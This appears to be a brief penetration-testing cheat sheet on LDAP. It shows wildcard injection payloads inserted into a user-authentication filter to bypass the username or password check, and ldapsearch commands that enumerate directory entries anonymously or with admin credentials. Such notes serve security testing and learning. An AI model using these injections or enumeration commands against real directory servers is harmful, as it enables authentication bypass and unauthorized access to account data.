# LDAP Injection
```powershell
(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password))

(&(objectClass=user)(sAMAccountName=$username = "*")(userPassword=$password))

(&(objectClass=user)(sAMAccountName=$username)(userPassword=$password = "*"))
```

# Ldapsearch
```powershell
ldapsearch -H ldap://<ip>:389 -x -b "dc=example,dc=com" "(objectClass=person)"

ldapsearch -H ldap://<ip>:389 -D "cn=admin,dc=example,dc=com" -w <pass> -b "dc=example,dc=com" "(objectClass=*)"
```
